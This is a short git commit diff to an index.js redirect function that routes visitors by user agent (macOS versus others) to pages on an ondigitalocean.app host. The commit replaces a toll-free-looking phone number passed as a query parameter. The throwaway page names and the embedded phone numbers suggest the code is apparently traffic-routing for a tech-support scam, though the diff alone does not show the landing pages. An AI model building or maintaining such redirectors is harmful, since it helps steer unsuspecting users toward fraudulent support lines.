b2a0f72c9ac1b5b6fdfb13c8b1e44597fb0e59d8
animalinside <akshay.anand12@yahoo.com>
2026-05-14 04:58:37 +0530

    Fix URLs in linkGroups for Group 1
    Updated URLs for Group 1 with new identifiers.

--- index.js
+++ index.js
@@ -51,8 +51,8 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://seahorse-app-t8by4.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
-            others: "https://seahorse-app-t8by4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
+            macos: "https://seahorse-app-t8by4.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
+            others: "https://seahorse-app-t8by4.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
         },
         {
             id: "Group 2",
